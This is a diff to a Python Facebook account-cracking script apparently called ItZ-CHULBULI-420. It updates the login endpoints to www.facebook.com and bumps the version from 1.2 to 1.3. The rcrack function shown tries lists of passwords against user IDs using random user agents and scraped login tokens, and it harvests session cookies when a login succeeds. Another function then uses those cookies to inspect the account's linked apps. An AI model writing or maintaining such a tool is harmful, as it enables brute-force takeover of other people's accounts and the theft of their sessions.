@@ -53,7 +53,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         else:
             print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://www.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -132,10 +132,10 @@ logo = ("""
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                   ItZ-CHULBULI-420
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[+] OWNER   :   ItZ-CHULBULI 
-[+] Facebook :  Zoya Khan 
-[+] Github   :  CHULBULI
-[+] Version  :    1.2
+[+] OWNER   :    ZOYA KHAN 
+[+] Facebook :   ZOYA KHAN 
+[+] Github   :   CHULBULI
+[+] Version  :    1.3
 [+] Tool     :    Free 
 """)
 def linex():
@@ -279,7 +279,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://m.alpha.facebook.com').text
+            free_fb = session.get('https://www.facebook.com').text
             log_data = {
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -313,7 +313,7 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
-            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
